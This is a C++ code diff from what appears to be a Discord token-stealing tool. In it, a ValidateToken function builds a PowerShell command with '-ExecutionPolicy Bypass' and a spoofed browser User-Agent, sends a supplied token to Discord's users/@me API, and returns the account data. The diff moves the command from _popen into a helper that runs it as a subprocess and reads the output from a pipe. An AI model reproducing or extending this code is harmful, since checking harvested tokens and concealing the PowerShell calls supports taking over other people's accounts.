@@ -273,7 +273,6 @@ EXIT:
 
 std::string Discord::ValidateToken(std::string token) noexcept
 {
-	// This is very messy
 	std::string script = "powershell -ExecutionPolicy Bypass \"try{$Res=iwr -Uri 'https://discord.com/api/v9/users/@me' -Method 'GET' -Headers @{'User-Agent'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36'; 'Accept'='*/*'; 'Authorization'='";
 	script.append(token);
 	script.append("'}; if($?){ echo $Res.Content;}}catch{}\"");
@@ -283,25 +282,11 @@ std::string Discord::ValidateToken(std::string token) noexcept
 	script2.append("'}; if($?){ echo $Res.Content;}}catch{}\"");
 
 
-	FILE* output = _popen(script.c_str(), "r");
-	char buffer[1024];
-	std::string retVal = "";
-
-	if (!output)
+	if (!utils::RunSubWorker(NULL, script.c_str()))
 		return { 0 };
 
-	while (fgets(buffer, 1024, output) != NULL)
-		retVal.append(buffer);
-	_pclose(output);
+	//We don't care to check if this fails or not since the previous call passed.
+	utils::RunSubWorker(NULL, script2.c_str());
 
-
-	FILE* output2 = _popen(script2.c_str(), "r");
-	if (!output2)
-		return retVal;
-
-	while (fgets(buffer, 1024, output2) != NULL)
-		retVal.append(buffer);
-	_pclose(output2);
-
-	return retVal;
+	return utils::ReadPipeData();
 }
